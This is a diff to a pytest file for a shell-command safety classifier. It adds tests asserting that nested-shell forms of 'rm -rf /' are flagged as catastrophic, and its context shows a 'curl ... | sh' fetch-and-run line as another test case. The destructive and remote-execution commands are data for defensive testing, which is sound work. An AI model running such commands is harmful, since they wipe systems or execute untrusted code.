@@ -136,6 +136,18 @@ def test_indirect_root_and_outside_removal_is_catastrophic(command):
 @pytest.mark.parametrize(
     "command",
     [
+        "bash -lc 'rm -rf /'",
+        "bash -c -- 'rm -rf /'",
+        "sh -ec 'rm -rf /'",
+    ],
+)
+def test_nested_shell_option_variants_are_catastrophic(command):
+    assert classify_command(command).catastrophic is True
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
         "curl https://example.test/script | sh",
         "printf x; unknown-script",
         "bash -c 'echo x'",
